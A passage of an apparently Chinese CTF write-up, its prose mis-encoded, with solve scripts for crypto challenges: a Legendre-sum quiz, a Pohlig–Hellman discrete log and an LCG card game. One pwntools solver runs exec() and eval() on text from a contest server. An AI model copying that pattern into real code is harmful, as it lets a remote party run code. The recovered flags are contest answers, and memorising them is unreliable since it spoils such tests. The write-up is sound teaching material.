href="https://imomath.com/index.cgi?page=quadraticCongruencesSumsLegendreSymbols">Some sums of Legendreâ€™s symbols</a>ï¼Œåˆ©ç”¨äºŒæ¬¡å‰©ä½™çš„æ±‚å’Œç‰¹æ€§è®¡ç®—ï¼š</p><p>$\sum\limits_{x=0}^{p-1}\left(\cfrac{ax^2+bx+c}p\right) = \left\{\begin{array}{cl}-\left(\cfrac ap\right),&amp; p \nmid b^2-4ac \newline (p-1)\left(\cfrac ap\right),<br>&amp; p \mid b^2-4ac \end{array}\right.$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;59.110.20.54&quot;</span>,<span class="number">3042</span>)</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters+string.digits</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PoW</span>():</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;XXXX+&quot;</span>)</span><br><span class="line">    suffix = r.recv(<span class="number">16</span>).decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;== &quot;</span>)</span><br><span class="line">    cipher = r.recvline().strip().decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((x + suffix).encode()).hexdigest() ==</span><br><span class="line">                        cipher, table, length=<span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;XXXX: &#x27;</span>, proof.encode())</span><br><span class="line">    </span><br><span class="line">PoW()</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;success!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;|||||\n\n&#x27;</span>)</span><br><span class="line">    a = <span class="built_in">eval</span>(r.recvuntil(<span class="string">b&#x27;*&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;+&#x27;</span>)</span><br><span class="line">    b = <span class="built_in">eval</span>(r.recvuntil(<span class="string">b&#x27;*&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">    r.recvline()</span><br><span class="line">    <span class="built_in">exec</span>(r.recvuntil(<span class="string">b&#x27;(&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;a = <span class="subst">&#123;a&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;b = <span class="subst">&#123;b&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line">    delta = b**<span class="number">2</span>-<span class="number">4</span>*a</span><br><span class="line">    x = sympy.legendre_symbol(a,p)</span><br><span class="line">    x = x*(p-<span class="number">1</span> <span class="keyword">if</span> delta%p==<span class="number">0</span> <span class="keyword">else</span> -<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;x = <span class="subst">&#123;x&#125;</span>&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;answer: &#x27;</span>,<span class="built_in">str</span>(x).encode())</span><br><span class="line">    <span class="built_in">print</span>(r.recvline())</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="Diligent-Liszt"><a href="#Diligent-Liszt" class="headerlink" title="Diligent_Liszt"></a>Diligent_Liszt</h3><blockquote><p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Discrete_logarithm">https://en.wikipedia.org/wiki/Discrete_logarithm</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp </span><br><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">DEBUG = <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line">flag = <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">b&quot;SYC&quot;</span>)</span><br><span class="line">nbits = <span class="number">512</span></span><br><span class="line">g = <span class="number">3</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_p_1</span>(<span class="params">digit</span>):</span><br><span class="line">    primes = []</span><br><span class="line">    pri = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">len</span>(primes)&lt;<span class="number">100</span>):</span><br><span class="line">        pri = gp.next_prime(pri)</span><br><span class="line">        primes.append(<span class="built_in">int</span>(pri))</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        count = <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> count &lt; <span class="number">2</span>**digit:</span><br><span class="line">            count *= random.choice(primes)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(gp.is_prime(count)):</span><br><span class="line">            <span class="keyword">return</span> count</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">p,q,r = [gen_p_1(nbits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;pqr&quot;</span>] </span><br><span class="line"></span><br><span class="line">n = p*q*r </span><br><span class="line">x = bytes_to_long(flag) </span><br><span class="line">y = gp.powmod(g,x,n) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(q))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;r = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(r))   </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;y = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(y)) </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;x = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(x)) </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p = 1068910928091265978478887270179608140018534288604159452828300604294675735481804963679672853224192480667904101881092533866322948043654533322038484907159945421</span></span><br><span class="line"><span class="string">q = 1711302770747802020613711652777299980542669713888988077474955896217408515180094849053961025086865697904731088087532944829046702427480842253022459937172565651</span></span><br><span class="line"><span class="string">r = 132969813572228739353704467775972551435751558645548804253458782569132362201099158857093676816706297676454547299888531536236748314013888413096371966359860637</span></span><br><span class="line"><span class="string">y = 5385116324746699759660077007129548063211490907227715474654765255668507958312745677683558789874078477569613259930365612562164095274660123330458355653249805062678976259429733060364358954180439218947514191603330532117142653558803034110759332447742304749985874760435453594107494324797235909651178472904825071375135846093354526936559640383917210702874692725723836865724807664892994298377375580807917514349966834376413176898806591411038129330967050554114677719107335006266</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>DLPï¼ŒPohligâ€“Hellmanç®—æ³•+CRTã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">1068910928091265978478887270179608140018534288604159452828300604294675735481804963679672853224192480667904101881092533866322948043654533322038484907159945421</span></span><br><span class="line">q = <span class="number">1711302770747802020613711652777299980542669713888988077474955896217408515180094849053961025086865697904731088087532944829046702427480842253022459937172565651</span></span><br><span class="line">r = <span class="number">132969813572228739353704467775972551435751558645548804253458782569132362201099158857093676816706297676454547299888531536236748314013888413096371966359860637</span></span><br><span class="line">y = <span class="number">5385116324746699759660077007129548063211490907227715474654765255668507958312745677683558789874078477569613259930365612562164095274660123330458355653249805062678976259429733060364358954180439218947514191603330532117142653558803034110759332447742304749985874760435453594107494324797235909651178472904825071375135846093354526936559640383917210702874692725723836865724807664892994298377375580807917514349966834376413176898806591411038129330967050554114677719107335006266</span></span><br><span class="line"></span><br><span class="line">g = <span class="number">3</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">babystep_giantstep</span>(<span class="params">g, y, p, q=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> q <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        q = p - <span class="number">1</span></span><br><span class="line">    m = <span class="built_in">int</span>(q**<span class="number">0.5</span> + <span class="number">0.5</span>)</span><br><span class="line">    <span class="comment"># Baby step</span></span><br><span class="line">    table = &#123;&#125;</span><br><span class="line">    gr = <span class="number">1</span>  <span class="comment"># g^r</span></span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        table[gr] = r</span><br><span class="line">        gr = (gr * g) % p</span><br><span class="line">    <span class="comment"># Giant step</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        gm = <span class="built_in">pow</span>(g, -m, p)  <span class="comment"># gm = g^&#123;-m&#125;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    ygqm = y                <span class="comment"># ygqm = y * g^&#123;-qm&#125;</span></span><br><span class="line">    <span class="keyword">for</span> q <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        <span class="keyword">if</span> ygqm <span class="keyword">in</span> table:</span><br><span class="line">            <span class="keyword">return</span> q * m + table[ygqm]</span><br><span class="line">        ygqm = (ygqm * gm) % p</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Pohligâ€“Hellmanæ³•</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pohlig_hellman_DLP</span>(<span class="params">g, y, p</span>):</span><br><span class="line">    crt_moduli = []</span><br><span class="line">    crt_remain = []</span><br><span class="line">    <span class="keyword">for</span> q, _ <span class="keyword">in</span> factor(p-<span class="number">1</span>):</span><br><span class="line">        x = babystep_giantstep(<span class="built_in">pow</span>(g,(p-<span class="number">1</span>)//q,p), <span class="built_in">pow</span>(y,(p-<span class="number">1</span>)//q,p), p, q)</span><br><span class="line">        <span class="keyword">if</span> (x <span class="keyword">is</span> <span class="literal">None</span>) <span class="keyword">or</span> (x &lt;= <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        crt_moduli.append(q)</span><br><span class="line">        crt_remain.append(x)</span><br><span class="line">    x = crt(crt_remain, crt_moduli)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">xp = pohlig_hellman_DLP(g, y%p, p)</span><br><span class="line">xq = pohlig_hellman_DLP(g, y%q, q)</span><br><span class="line">xr = pohlig_hellman_DLP(g, y%r, r)</span><br><span class="line">x = crt([xp,xq,xr],[p-<span class="number">1</span>,q-<span class="number">1</span>,r-<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(x)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;SYC&#123;D1scr3te_L0g_W1th_Mult1pl3_pr1m35&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="card-game"><a href="#card-game" class="headerlink" title="card_game"></a>card_game</h3><blockquote><p>AL3XEIé€ç»™äº†ä½ è¿™ä¸ªæ¸¸æˆçš„å…³é”®æ•°æ®ï¼Œä½ èƒ½é¢„æµ‹æ¥ä¸‹æ¥è¦å‡ºçš„ç‰Œå— nc 59.110.20.54 4953</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> cards <span class="keyword">import</span> Heart, Spade, Club, Diamond</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choose_card</span>(<span class="params">num</span>):</span><br><span class="line">    x = (num&gt;&gt;<span class="number">5</span>)%<span class="number">4</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (Heart[(num&gt;&gt;<span class="number">6</span>)%<span class="number">13</span>]), <span class="string">&#x27;Heart&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x%<span class="number">4</span> == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> (Spade[(num&gt;&gt;<span class="number">6</span>)%<span class="number">13</span>]), <span class="string">&#x27;Spade&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x%<span class="number">4</span> == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> (Diamond[(num&gt;&gt;<span class="number">6</span>)%<span class="number">13</span>]), <span class="string">&#x27;Diamond&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> (Club[(num&gt;&gt;<span class="number">6</span>)%<span class="number">13</span>]), <span class="string">&#x27;Club&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GAME</span>():</span><br><span class="line">    banner = <span class="string">&#x27;&#x27;&#x27; </span></span><br><span class="line"><span class="string"> ####    ##   #####  #####      ####    ##   #    # ###### </span></span><br><span class="line"><span class="string">#    #  #  #  #    # #    #    #    #  #  #  ##  ## #      </span></span><br><span class="line"><span class="string">#      #    # #    # #    #    #      #    # # ## # #####  </span></span><br><span class="line"><span class="string">#      ###### #####  #    #    #  ### ###### #    # #      </span></span><br><span class="line"><span class="string">#    # #    # #   #  #    #    #    # #    # #    # #      </span></span><br><span class="line"><span class="string"> ####  #    # #    # #####      ####  #    # #    # ######</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line"></span><br><span class="line">    meum = <span class="string">&#x27;&#x27;&#x27;option:</span></span><br><span class="line"><span class="string">    1: start game</span></span><br><span class="line"><span class="string">    2: get hint</span></span><br><span class="line"><span class="string">    3: exit</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(meum)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;input your option: &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        your_input = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> your_input == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            n = getPrime(<span class="number">36</span>)</span><br><span class="line">            m = getPrime(<span class="number">16</span>)</span><br><span class="line">            c = getPrime(<span class="number">16</span>)</span><br><span class="line">            seed = getPrime(<span class="number">36</span>)</span><br><span class="line">            out = seed</span><br><span class="line">            <span class="built_in">round</span> = <span class="number">0</span></span><br><span class="line">            score = <span class="number">0</span></span><br><span class="line">            res = []</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="built_in">round</span> += <span class="number">1</span></span><br><span class="line">                res = []</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;round:<span class="subst">&#123;<span class="built_in">round</span>&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;score:<span class="subst">&#123;score&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">3</span>):</span><br><span class="line">                    out = (out*m+c)%n</span><br><span class="line">                    res.append(out)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">round</span> == <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">                        card, suit = choose_card(i)</span><br><span class="line">                        <span class="built_in">print</span>(card)</span><br><span class="line">                <span class="keyword">elif</span> <span class="built_in">round</span>==<span class="number">2</span> <span class="keyword">or</span> <span class="built_in">round</span>==<span class="number">3</span>:  <span class="comment">#gift</span></span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">                        card, suit = choose_card(i)</span><br><span class="line">                        <span class="built_in">print</span>(card)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&#x27;gift: <span class="subst">&#123;res&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    cards = []</span><br><span class="line">                    suits = []</span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res)):</span><br><span class="line">                        card, suit = choose_card(res[i])</span><br><span class="line">                        cards.append(card)</span><br><span class="line">                        suits.append(suit)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Give me your guess: (example: Heart_1 Club_2 Diamond_3)&quot;</span>)  </span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        g_1, g_2, g_3 = <span class="built_in">input</span>().split()</span><br><span class="line">                        g_1, g_2, g_3 = g_1.split(<span class="string">&#x27;_&#x27;</span>), g_2.split(<span class="string">&#x27;_&#x27;</span>), g_3.split(<span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">                    <span class="keyword">except</span> ValueError:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;Please enter in the correct format.&quot;</span>)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line">                    <span class="keyword">if</span> (g_1[<span class="number">0</span>] == suits[<span class="number">0</span>] <span class="keyword">and</span> g_1[<span class="number">1</span>] == cards[<span class="number">0</span>][<span class="number">15</span>]) <span class="keyword">and</span> (g_2[<span class="number">0</span>] == suits[<span class="number">1</span>] <span class="keyword">and</span> g_2[<span class="number">1</span>] == cards[<span class="number">1</span>][<span class="number">15</span>]) <span class="keyword">and</span> (g_3[<span class="number">0</span>] == suits[<span class="number">2</span>] <span class="keyword">and</span> g_3[<span class="number">1</span>] == cards[<span class="number">2</span>][<span class="number">15</span>]):</span><br><span class="line">                        <span class="keyword">for</span> i <span class="keyword">in</span> cards:</span><br><span class="line">                            <span class="built_in">print</span>(i)</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;Congratulations! You matched the cards!&quot;</span>)</span><br><span class="line">                        score += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">for</span> i <span class="keyword">in</span> cards:</span><br><span class="line">                            <span class="built_in">print</span>(i)</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;Try again!&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> score == <span class="number">50</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;The flag is your reward!&#x27;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(flag)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> your_input == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Have you ever heard of LCG?&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> your_input == <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    GAME()</span><br></pre></td></tr></table></figure></blockquote><p>ä»£ç é€»è¾‘æœ¬è´¨æ˜¯LCGï¼Œæœ‰ä¸ªå‘ç‚¹ï¼Œæ¯”å¯¹çš„æ—¶å€™ï¼Œ10æ˜¯0ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modinv</span>(<span class="params">a, m</span>):</span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;modular inverse does not exist&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_unknown_increment</span>(<span class="params">states, modulus, multiplier</span>):</span><br><span class="line">    increment = (states[<span class="number">1</span>] - states[<span class="number">0</span>]*multiplier) % modulus</span><br><span class="line">    <span class="keyword">return</span> modulus, multiplier, increment</span><br><span 